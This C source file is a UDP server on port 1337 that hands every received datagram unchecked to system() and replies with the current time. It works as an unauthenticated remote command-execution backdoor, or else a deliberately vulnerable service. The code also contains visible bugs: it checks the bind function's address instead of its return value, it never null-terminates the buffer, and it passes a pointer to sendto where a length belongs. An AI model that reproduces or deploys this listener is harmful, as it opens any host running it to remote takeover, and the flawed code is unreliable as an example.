#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#define PORT 1337
#define BUFLEN 512
int puts(const char *s);
int main()
{
	int server_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP), client_fd;
	if(server_fd < 0)
	{
		printf("Socket could not be created\n");
		exit(1);
	}
	else
		printf("Socket created\n");

	struct sockaddr_in server, client;
	server.sin_family = AF_INET;
	server.sin_port = htons(PORT);
	server.sin_addr.s_addr = htonl(INADDR_ANY);

	socklen_t len = sizeof(client);

	int bnd = bind(server_fd, (struct sockaddr *) &server, sizeof(server));
	if(bind < 0)
	{
		printf("Could not bind socket\n");
		exit(1);
	}

	else
		printf("Socket bound on %d\n", PORT);

	char buffer[BUFLEN];
	
	while(1)
	{
		int status = recvfrom(server_fd, buffer, BUFLEN, 0, (struct sockaddr *) &client, &len);
		
		if(status < 0)
		{
			printf("Read Failed\n");
			exit(1);
		}

		time_t srvtime;
		
		status = system(buffer);

		if(status < 0)
		{
			printf("Input Command Failed\n");
		}

		srvtime = time(NULL);
		strcpy(buffer, ctime(&srvtime));

		status = sendto(server_fd, buffer, BUFLEN, 0, (struct sockaddr *) &client, &len);
		
		if(status < 0)
		{
			printf("Send Failed\n");
			exit(1);
		}
	}

	close(server_fd);
}
